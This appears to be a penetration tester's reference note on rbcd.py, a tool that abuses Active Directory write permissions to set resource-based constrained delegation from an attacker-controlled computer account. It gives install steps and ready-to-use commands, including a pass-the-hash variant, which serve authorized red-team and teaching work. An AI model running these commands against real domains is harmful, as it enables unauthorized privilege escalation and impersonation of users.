# rbcd.py

**Tags:** `#rbcd` `#resourcebasedconstraineddelegation` `#kerberos` `#activedirectory` `#delegation` `#python`

Python script that writes `msDS-AllowedToActOnBehalfOfOtherIdentity` on a target computer object to configure Resource-Based Constrained Delegation (RBCD) from an attacker-controlled computer account. Several forks exist (original technique by Elad Shamir; actively maintained implementation: AlteredSecurity/RBCD, built on Impacket). Used after creating/controlling a computer account and confirming write access (`GenericAll`/`GenericWrite`/`WriteDacl`) on the target computer object.

**Source:** https://github.com/AlteredSecurity/RBCD (maintained fork, built on Impacket)
**Install:**
```bash
git clone https://github.com/AlteredSecurity/RBCD
pip install -r RBCD/requirements.txt
```

```bash
# Add EVIL$ as an allowed delegator on the target computer object.
# Interface: HOSTNAME is a POSITIONAL (the DC / ldap host); creds go in -u/-p
# (there is NO -dc-ip flag, and no domain/user:pass positional in this script).
#   -t = target computer (attacker has write access to its properties)
#   -f = the (fake) computer the attacker controls
python3 rbcd.py -u '<domain>\<user>' -p '<pass>' -t <target_computer> -f EVIL <dc_host_or_ip>

# -p also accepts an LM:NTLM hash instead of a password (pass-the-hash)
python3 rbcd.py -u '<domain>\<user>' -p ':<NT-hash>' -t <target_computer> -f EVIL <dc_host_or_ip>
```

> [!note] **See also** — [[Services/Active Directory/Kerberos|Kerberos]] Resource-Based Constrained Delegation section for the full attack chain (create computer account → set RBCD → S4U2Proxy for a service ticket). Also [[Services/Active Directory/ACL Abuse|ACL Abuse]] — `GenericWrite` on a computer object is what enables the RBCD write in the first place.

---

*Created: 2026-07-27*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
